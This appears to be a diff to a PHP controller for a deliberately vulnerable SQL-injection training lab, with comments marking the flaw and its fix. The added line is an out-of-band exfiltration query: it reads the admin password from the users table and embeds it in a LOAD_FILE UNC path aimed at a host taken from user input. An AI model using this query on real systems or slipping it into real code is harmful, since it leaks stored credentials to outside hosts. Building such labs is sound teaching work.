@@ -90,7 +90,7 @@ class SqliLabController extends Controller
 
         // [VULNERABLE HERE] User input is directly injected into a DB call chain.
         // FIX: Never concatenate user input into SQL. Validate allow-list + bindings.
-        $sql = "SELECT LOAD_FILE(CONCAT('\\\\', '$channel', '\\\\share\\\\probe.txt')) AS probe";
+        $sql = "SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE email='admin@lab.local'), '$channel\\share\\probe.txt'))";
 
         $dbError = null;
         $rows = [];
